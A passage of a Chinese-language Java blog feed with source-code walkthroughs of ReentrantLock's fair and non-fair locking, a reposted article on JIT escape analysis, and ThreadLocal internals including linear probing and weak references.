class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">   <span class="comment">//获取当前线程</span></span><br><span class="line">          <span class="keyword">final</span> Thread current = Thread.currentThread();</span><br><span class="line">          <span class="keyword">int</span> c = getState();</span><br><span class="line">   <span class="comment">//c等于0，说明锁没有被线程占有，可以试图获取锁</span></span><br><span class="line">          <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="comment">//如果前面没有线程排队，就用CAS把state从0更新为1</span></span><br><span class="line">              <span class="keyword">if</span> (!hasQueuedPredecessors() &amp;&amp;</span><br><span class="line">                  compareAndSetState(<span class="number">0</span>, acquires)) &#123;</span><br><span class="line">                  <span class="comment">//获取到锁了，标记一下，告诉大家，现在是本线程占用了锁</span></span><br><span class="line">                  setExclusiveOwnerThread(current);</span><br><span class="line">                  <span class="comment">//锁获取成功，直接返回</span></span><br><span class="line">                  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">    <span class="comment">//c不等于0或者上面CAS操作失败了，说明锁被某线程占有</span></span><br><span class="line">   <span class="comment">//重入就在下面这段代码实现的</span></span><br><span class="line">   <span class="comment">//由于ReentrantLock是可重入，如果获取锁的线程是当前线程，那还是可以再操作一波的</span></span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class="line">              <span class="comment">//重入了就对state再加1，别忘了acquires是写死为1的</span></span><br><span class="line">              <span class="keyword">int</span> nextc = c + acquires;</span><br><span class="line">              <span class="keyword">if</span> (nextc &lt; <span class="number">0</span>)</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"Maximum lock count exceeded"</span>);</span><br><span class="line">              <span class="comment">//注意：可重入锁加了几次就要释放几次</span></span><br><span class="line">              setState(nextc);</span><br><span class="line">              <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="非公平锁"><a href="#非公平锁" class="headerlink" title="非公平锁"></a>非公平锁</h2><p>非公平锁就两方法lock和tryAcquire</p><h3 id="lock-1"><a href="#lock-1" class="headerlink" title="lock"></a>lock</h3><p>第一次不加队列，直接先CAS试图获取锁。没有成功在走AQS的acquire方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">             setExclusiveOwnerThread(Thread.currentThread());</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">             <span class="comment">//没有成功在走AQS的acquire方法,去排队。</span></span><br><span class="line">             acquire(<span class="number">1</span>);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><h3 id="AQS的acquire-1"><a href="#AQS的acquire-1" class="headerlink" title="AQS的acquire"></a>AQS的acquire</h3><p><em>点进acquire方法发现它跳到 AQS的acquire方法里去了，而点进AQS的tryAcquire发现它只抛出一个不支持操作的异常。也就是说在公平锁里，加锁这个操作用的AQS的<strong>acquire</strong>（和非公平锁<strong>共用</strong>），而<strong>tryAcquire</strong>是公平锁和非公平锁<strong>各自</strong>实现的。</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">acquire</span><span class="params">(<span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!tryAcquire(arg) &amp;&amp;</span><br><span class="line">            acquireQueued(addWaiter(Node.EXCLUSIVE), arg))</span><br><span class="line">        selfInterrupt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>### </p><h3 id="tryAcquire-1"><a href="#tryAcquire-1" class="headerlink" title="tryAcquire"></a>tryAcquire</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">final</span> Thread current = Thread.currentThread();</span><br><span class="line">       <span class="keyword">int</span> c = getState();</span><br><span class="line">       <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (!hasQueuedPredecessors() &amp;&amp;</span><br><span class="line">               compareAndSetState(<span class="number">0</span>, acquires)) &#123;</span><br><span class="line">               setExclusiveOwnerThread(current);</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class="line">           <span class="keyword">int</span> nextc = c + acquires;</span><br><span class="line">           <span class="keyword">if</span> (nextc &lt; <span class="number">0</span>)</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"Maximum lock count exceeded"</span>);</span><br><span class="line">           setState(nextc);</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="tryRelease"><a href="#tryRelease" class="headerlink" title="tryRelease()"></a>tryRelease()</h2><p>可重入方式的释放锁</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryRelease</span><span class="params">(<span class="keyword">int</span> releases)</span> </span>&#123;</span><br><span class="line"><span class="comment">//只是State减1，还未更新</span></span><br><span class="line">       <span class="keyword">int</span> c = getState() - releases;</span><br><span class="line">    <span class="comment">//如果获取锁的线程不是当前线程，释放失败</span></span><br><span class="line">       <span class="keyword">if</span> (Thread.currentThread() != getExclusiveOwnerThread())</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalMonitorStateException();</span><br><span class="line">    </span><br><span class="line">       <span class="keyword">boolean</span> free = <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">//State等于0，锁被释放了</span></span><br><span class="line">    <span class="comment">//也有可能减1后不等于0，因为可重入锁的State的可以一直加的</span></span><br><span class="line">       <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">           free = <span class="keyword">true</span>;</span><br><span class="line">           setExclusiveOwnerThread(<span class="keyword">null</span>);</span><br><span class="line">       &#125;<span class="comment">//更新</span></span><br><span class="line">       setState(c);</span><br><span class="line">       <span class="keyword">return</span> free;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="Synchronized与ReentrantLock的区别"><a href="#Synchronized与ReentrantLock的区别" class="headerlink" title="Synchronized与ReentrantLock的区别"></a>Synchronized与ReentrantLock的区别</h2><p>1）互斥锁<br>2）可重入<br>3）都保证了可见性和互斥性<br>两者的不同点：<br>1）ReentrantLock显示获得、释放锁，synchronized隐式获得释放锁<br>2）ReentrantLock可响应中断、可轮回，synchronized是不可以响应中断的，为处理锁的不可用性提供了更高的灵活性<br>3）ReentrantLock是API级别的，synchronized是JVM级别的<br>4）ReentrantLock可以实现公平锁<br>5）ReentrantLock通过Condition可以绑定多个条件<br>6）底层实现不一样， synchronized是同步阻塞，使用的是悲观并发策略，lock是同步非阻塞，采用的是乐观并发策略</p>]]></content>
      
      
      <categories>
          
          <category> 并发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>逃逸分析</title>
      <link href="/2019/08/12/%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/"/>
      <url>/2019/08/12/%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>本文转自掘金<strong>HollisChuang</strong>，<a href="https://mp.weixin.qq.com/s/HWIuXNWjyfV-5UVoQG3vSQ" target="_blank" rel="noopener">原地址</a>。<br>写的非常好，忍不住转载了。在文章最后写了自己的笔记。</p><p>[TOC]</p><h2 id="我的笔记"><a href="#我的笔记" class="headerlink" title="我的笔记"></a>我的笔记</h2><h3 id="JIT-技术（即时编译）"><a href="#JIT-技术（即时编译）" class="headerlink" title="JIT 技术（即时编译）"></a>JIT 技术（即时编译）</h3><p>Java需要经过两段编译，第一段是把.java文件转换成.class文件。第二段编译是把.class转换成机器指令的过程。显然，其执行速度必然会比可执行的二进制字节码程序慢很多。为了优化效率，引入了 JIT 。</p><p>当JVM发现某个方法或代码块运行特别频繁的时候，就会认为这是“热点代码”（Hot Spot Code)。然后JIT会把部分“热点代码”翻译成本地机器相关的机器码，并进行优化，然后再把翻译后的机器码缓存起来，以备下次使用。</p><p>JIT优化中最重要的一个就是逃逸分析。</p><h3 id="逃逸分析"><a href="#逃逸分析" class="headerlink" title="逃逸分析"></a>逃逸分析</h3><p>逃逸分析即<strong>分析对象动态作用域</strong>。如果一个对象只在方法内使用，我们就可以做一些<strong>优化</strong>。</p><ol><li>栈上分配：如果对象没有发生逃逸，就可以栈上分配。这样就无需在堆上分配内存，也无须进行垃圾回收了。</li><li>同步消除：如果对象没有发生逃逸，那么这个对象只能够被一个线程访问（因为虚拟机栈是线程私有的），JIT会取消对这部分代码的同步。</li><li>标量替换，把对象拆分成几个被方法代替的成员变量。</li></ol><h3 id="JVM参数"><a href="#JVM参数" class="headerlink" title="JVM参数"></a>JVM参数</h3><ul><li><code>-XX:+DoEscapeAnalysis</code> ： 表示开启逃逸分析</li><li><code>-XX:-DoEscapeAnalysis</code> ： 表示关闭逃逸分析 从jdk 1.7开始已经默认开始逃逸分析，如需关闭，需要指定-XX:-DoEscapeAnalysis</li></ul><p>看完这篇，就可以回答，是不是所有的对象和数组都会在堆内存分配空间？</p><p>不一定，如果JIT经过逃逸分析，发现有些对象没有逃逸出方法，那么有可能堆内存分配会被优化成栈内存分配。但是这也并不是绝对的。</p><h2 id="原文：深入理解Java中的逃逸分析"><a href="#原文：深入理解Java中的逃逸分析" class="headerlink" title="原文：深入理解Java中的逃逸分析"></a>原文：深入理解Java中的逃逸分析</h2><p>在Java的编译体系中，一个Java的源代码文件变成计算机可执行的机器指令的过程中，需要经过两段编译，第一段是把.java文件转换成.class文件。第二段编译是把.class转换成机器指令的过程。</p><p>第一段编译就是<code>javac</code>命令。</p><p>在第二编译阶段，JVM 通过解释字节码将其翻译成对应的机器指令，逐条读入，逐条解释翻译。很显然，经过解释执行，其执行速度必然会比可执行的二进制字节码程序慢很多。这就是传统的JVM的解释器（Interpreter）的功能。为了解决这种效率问题，引入了 JIT（即时编译） 技术。</p><p>引入了 JIT 技术后，Java程序还是通过解释器进行解释执行，当JVM发现某个方法或代码块运行特别频繁的时候，就会认为这是“热点代码”（Hot Spot Code)。然后JIT会把部分“热点代码”翻译成本地机器相关的机器码，并进行优化，然后再把翻译后的机器码缓存起来，以备下次使用。</p><p>由于关于JIT编译和热点检测的内容，我在<a href="https://link.juejin.im/?target=http%3A%2F%2Fwww.hollischuang.com%2Farchives%2F2322" target="_blank" rel="noopener">深入分析Java的编译原理</a>中已经介绍过了，这里就不在赘述，本文主要来介绍下JIT中的优化。JIT优化中最重要的一个就是逃逸分析。</p><h3 id="逃逸分析-1"><a href="#逃逸分析-1" class="headerlink" title="逃逸分析"></a>逃逸分析</h3><p>关于逃逸分析的概念，可以参考<a href="https://link.juejin.im/?target=http%3A%2F%2Fwww.hollischuang.com%2Farchives%2F2398" target="_blank" rel="noopener">对象和数组并不是都在堆上分配内存的。</a>一文，这里简单回顾一下：</p><p>逃逸分析的基本行为就是<strong>分析对象动态作用域</strong>：当一个对象在方法中被定义后，它可能被外部方法所引用，例如作为调用参数传递到其他地方中，称为方法逃逸。</p><p>例如以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public static StringBuffer craeteStringBuffer(String s1, String s2) &#123;</span><br><span class="line">    StringBuffer sb = new StringBuffer();</span><br><span class="line">    sb.append(s1);</span><br><span class="line">    sb.append(s2);</span><br><span class="line">    return sb;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static String createStringBuffer(String s1, String s2) &#123;</span><br><span class="line">    StringBuffer sb = new StringBuffer();</span><br><span class="line">    sb.append(s1);</span><br><span class="line">    sb.append(s2);</span><br><span class="line">    return sb.toString();</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>第一段代码中的<code>sb</code>就逃逸了，而第二段代码中的<code>sb</code>就没有逃逸。</p><p>使用逃逸分析，编译器可以对代码做如下优化：</p><p>一、同步省略。如果一个对象被发现只能从一个线程被访问到，那么对于这个对象的操作可以不考虑同步。</p><p>二、将堆分配转化为栈分配。如果一个对象在子程序中被分配，要使指向该对象的指针永远不会逃逸，对象可能是栈分配的候选，而不是堆分配。</p><p>三、分离对象或标量替换。有的对象可能不需要作为一个连续的内存结构存在也可以被访问到，那么对象的部分（或全部）可以不存储在内存，而是存储在CPU寄存器中。</p><p>在Java代码运行时，通过JVM参数可指定是否开启逃逸分析，</p><p><code>-XX:+DoEscapeAnalysis</code> ： 表示开启逃逸分析</p><p><code>-XX:-DoEscapeAnalysis</code> ： 表示关闭逃逸分析 从jdk 1.7开始已经默认开始逃逸分析，如需关闭，需要指定-XX:-DoEscapeAnalysis</p><h3 id="同步省略"><a href="#同步省略" class="headerlink" title="同步省略"></a>同步省略</h3><p>在动态编译同步块的时候，JIT编译器可以借助逃逸分析来判断同步块所使用的锁对象是否只能够被一个线程访问而没有被发布到其他线程。</p><p>如果同步块所使用的锁对象通过这种分析被证实只能够被一个线程访问，那么JIT编译器在编译这个同步块的时候就会取消对这部分代码的同步。这个取消同步的过程就叫同步省略，也叫<a href="https://link.juejin.im/?target=http%3A%2F%2Fwww.hollischuang.com%2Farchives%2F2344" target="_blank" rel="noopener">锁消除</a>。</p><p>如以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public void f() &#123;</span><br><span class="line">    Object hollis = new Object();</span><br><span class="line">    synchronized(hollis) &#123;</span><br><span class="line">        System.out.println(hollis);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>代码中对hollis这个对象进行加锁，但是hollis对象的生命周期只在f()方法中，并不会被其他线程所访问到，所以在JIT编译阶段就会被优化掉。优化成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public void f() &#123;</span><br><span class="line">    Object hollis = new Object();</span><br><span class="line">    System.out.println(hollis);</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>所以，在使用synchronized的时候，如果JIT经过逃逸分析之后发现并无线程安全问题的话，就会做锁消除。</p><h3 id="标量替换"><a href="#标量替换" class="headerlink" title="标量替换"></a>标量替换</h3><p>标量（Scalar）是指一个无法再分解成更小的数据的数据。Java中的原始数据类型就是标量。相对的，那些还可以分解的数据叫做聚合量（Aggregate），Java中的对象就是聚合量，因为他可以分解成其他聚合量和标量。</p><p>在JIT阶段，如果经过逃逸分析，发现一个对象不会被外界访问的话，那么经过JIT优化，就会把这个对象拆解成若干个其中包含的若干个成员变量来代替。这个过程就是标量替换。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">   alloc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static void alloc() &#123;</span><br><span class="line">   Point point = new Point（1,2）;</span><br><span class="line">   System.out.println(&quot;point.x=&quot;+point.x+&quot;; point.y=&quot;+point.y);</span><br><span class="line">&#125;</span><br><span class="line">class Point&#123;</span><br><span class="line">    private int x;</span><br><span class="line">    private int y;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>以上代码中，point对象并没有逃逸出<code>alloc</code>方法，并且point对象是可以拆解成标量的。那么，JIT就会不会直接创建Point对象，而是直接使用两个标量int x ，int y来替代Point对象。</p><p>以上代码，经过标量替换后，就会变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private static void alloc() &#123;</span><br><span class="line">   int x = 1;</span><br><span class="line">   int y = 2;</span><br><span class="line">   System.out.println(&quot;point.x=&quot;+x+&quot;; point.y=&quot;+y);</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>可以看到，Point这个聚合量经过逃逸分析后，发现他并没有逃逸，就被替换成两个聚合量了。那么标量替换有什么好处呢？就是可以大大减少堆内存的占用。因为一旦不需要创建对象了，那么就不再需要分配堆内存了。</p><p>标量替换为栈上分配提供了很好的基础。</p><h3 id="栈上分配"><a href="#栈上分配" class="headerlink" title="栈上分配"></a>栈上分配</h3><p>在Java虚拟机中，对象是在Java堆中分配内存的，这是一个普遍的常识。但是，有一种特殊情况，那就是如果经过逃逸分析后发现，一个对象并没有逃逸出方法的话，那么就可能被优化成栈上分配。这样就无需在堆上分配内存，也无须进行垃圾回收了。</p><p>关于栈上分配的详细介绍，可以参考<a href="https://link.juejin.im/?target=http%3A%2F%2Fwww.hollischuang.com%2Farchives%2F2398" target="_blank" rel="noopener">对象和数组并不是都在堆上分配内存的。</a>。</p><p>这里，还是要简单说一下，其实在现有的虚拟机中，并没有真正的实现栈上分配，在<a href="https://link.juejin.im/?target=http%3A%2F%2Fwww.hollischuang.com%2Farchives%2F2398" target="_blank" rel="noopener">对象和数组并不是都在堆上分配内存的。</a>中我们的例子中，对象没有在堆上分配，其实是标量替换实现的。</p><h3 id="逃逸分析并不成熟"><a href="#逃逸分析并不成熟" class="headerlink" title="逃逸分析并不成熟"></a>逃逸分析并不成熟</h3><p>关于逃逸分析的论文在1999年就已经发表了，但直到JDK 1.6才有实现，而且这项技术到如今也并不是十分成熟的。</p><p>其根本原因就是无法保证逃逸分析的性能消耗一定能高于他的消耗。虽然经过逃逸分析可以做标量替换、栈上分配、和锁消除。但是逃逸分析自身也是需要进行一系列复杂的分析的，这其实也是一个相对耗时的过程。</p><p>一个极端的例子，就是经过逃逸分析之后，发现没有一个对象是不逃逸的。那这个逃逸分析的过程就白白浪费掉了。</p><p>虽然这项技术并不十分成熟，但是他也是即时编译器优化技术中一个十分重要的手段。</p>]]></content>
      
      
      <categories>
          
          <category> jvm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ThreadLocal源码分析</title>
      <link href="/2019/08/10/ThreadLocal/"/>
      <url>/2019/08/10/ThreadLocal/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>前言：ThreadLocal线程局部变量，为每一个使用该变量的线程都提供一个变量值的副本，每一个线程都可以独立地改变自己的副本，而不会和其它线程的副本冲突。即“以空间换时间”的方式解决线程不安全问题。</p><p>本文首先对ThreadLocal进行源码分析以阐明其原理，而后介绍ThreadLocal重要的三个知识点：它用来解决冲突的办法——线性探测法、它用来解决内存泄露的办法——弱引用、ThreadLocal的清理时机尤其要注意线程池这个例外。</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>ThreadLocal中有一个静态内部类ThreadLocalMap（类似于HashMap但不是）。这个Map的<strong>key是ThreadLocal当前对象，value就是我们存起来的值</strong>。</p><p>下面通过分析重要方法的源码来一探究竟。</p><h4 id="getMap"><a href="#getMap" class="headerlink" title="getMap()"></a>getMap()</h4><p>取得的是当前线程的ThreadLocalMap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ThreadLocalMap getMap(Thread t) &#123;</span><br><span class="line">       return t.threadLocals;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>注意：这个map取得的是Thread类的成员变量ThreadLocalMap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Thread implements Runnable &#123;</span><br><span class="line">//每个线程都有自己ThreadLocalMap！</span><br><span class="line">ThreadLocal.ThreadLocalMap threadLocals = null;</span><br></pre></td></tr></table></figure><h4 id="set"><a href="#set" class="headerlink" title="set()"></a>set()</h4><p>取当前线程的ThreadLocalMap，key设置为ThreadLocal当前对象，value设置为传入的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public void set(T value) &#123;</span><br><span class="line">     Thread t = Thread.currentThread();</span><br><span class="line">     ThreadLocalMap map = getMap(t);</span><br><span class="line">     if (map != null)</span><br><span class="line">         map.set(this, value);</span><br><span class="line">     else</span><br><span class="line">         createMap(t, value);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h4><p>取当前线程的ThreadLocalMap，将threadLocal作为key获取Entry后获取value。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> T <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     Thread t = Thread.currentThread();</span><br><span class="line">     <span class="comment">//取当前对象的map</span></span><br><span class="line">     ThreadLocalMap map = getMap(t);</span><br><span class="line">     <span class="keyword">if</span> (map != <span class="keyword">null</span>) &#123;</span><br><span class="line">     <span class="comment">//将自己作为key取值</span></span><br><span class="line">         ThreadLocalMap.Entry e = map.getEntry(<span class="keyword">this</span>);</span><br><span class="line">         <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123;</span><br><span class="line">             <span class="keyword">return</span> (T)e.value;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> setInitialValue();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="线性探测法"><a href="#线性探测法" class="headerlink" title="线性探测法"></a>线性探测法</h2><p>ThreadLocalMap是典型的使用线性探测法解决hash冲突的：发生冲突，从该位置向后找到表中的下一个空槽放入。这种简单的方法会导致相同hash值的元素挨在一起和其他hash值对应的槽被占用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(ThreadLocal&lt;?&gt; key, Object value)</span> </span>&#123;</span><br><span class="line">......</span><br><span class="line"><span class="comment">//发生冲突，循环去找下一个为空的槽</span></span><br><span class="line"><span class="comment">//nextIndex()方法就是在长度范围内做i++的操作</span></span><br><span class="line"> <span class="keyword">for</span> (Entry e = tab[i];</span><br><span class="line">                 e != <span class="keyword">null</span>;</span><br><span class="line">                 e = tab[i = nextIndex(i, len)]) &#123;</span><br><span class="line">                ThreadLocal&lt;?&gt; k = e.get();</span><br><span class="line"><span class="comment">//key是一样就更新</span></span><br><span class="line">                <span class="keyword">if</span> (k == key) &#123;</span><br><span class="line">                    e.value = value;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//找到下一个空槽就放进去</span></span><br><span class="line">                <span class="keyword">if</span> (k == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    replaceStaleEntry(key, value, i);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h2 id="弱引用"><a href="#弱引用" class="headerlink" title="弱引用"></a>弱引用</h2><p>总所周知，只要还有引用指向，这个对象就不会被回收。这是针对强引用而言。如果一个类继承了软引用指向实例，如果这个实例没有其他引用了，只有该类引用了，这个对象会被GC立即回收。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A a = new A();</span><br><span class="line">B b = new B(a);</span><br><span class="line">a = null;//这样a是不会被回收是，因为b还依赖a，造成了内存泄漏。</span><br><span class="line"></span><br><span class="line">b = null;//此时，a才会被回收，因为没有引用指向了</span><br></pre></td></tr></table></figure><p>如果b还有有用，不能赋值为空，岂非a一直不能被回收？非也，我们还可以用弱引用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A a = new A();</span><br><span class="line">WeakReference b = new WeakReference(a);</span><br><span class="line">a=null//GC会立刻回收A这个对象</span><br></pre></td></tr></table></figure><p>顺便说一嘴，软引用和弱引用一样, 但被GC回收的时候需要多一个条件: 当系统内存不足时才会被回收. 正因为有这个特性, 软引用比弱引用更加适合做缓存对象的引用。</p><p><strong>ThreadLocal使用了弱引用</strong>.key指向ThreadLocal实例，当ThreadLocal外部强引用被回收时候，key虽然还是指向ThreadLocal，但因为是弱引用，GC会发现并回收。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static class Entry extends WeakReference&lt;ThreadLocal&lt;?&gt;&gt; &#123;</span><br><span class="line">       /** The value associated with this ThreadLocal. */</span><br><span class="line">       Object value;</span><br><span class="line"></span><br><span class="line">       Entry(ThreadLocal&lt;?&gt; k, Object v) &#123;</span><br><span class="line">           super(k);</span><br><span class="line">           value = v;</span><br><span class="line">       &#125;</span><br><span class="line">   